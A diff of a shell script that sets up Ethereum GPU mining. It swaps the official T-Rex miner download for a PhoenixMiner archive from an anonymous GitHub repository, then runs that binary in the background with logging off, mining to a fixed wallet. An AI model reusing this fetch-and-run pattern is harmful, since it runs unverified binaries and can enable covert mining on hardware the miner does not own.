@@ -17,16 +17,16 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	sudo apt-get -y install cuda
 	sudo apt-get install libcurl3 -y
 	echo "taind vip pro" > isHaveSetupCoin.txt
-	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
+	wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
   	sudo killall XXX
-  	./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -p x -w $woker &
+	./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -worker $woker -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 else
 	if pgrep t-rex >/dev/null 2>&1
 	then
 		echo "RUNNING"
 	else
-		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
+		wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
     		sudo killall XXX
-    		./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -p x -w $woker &
+			./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -worker $woker -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 	fi
 fi
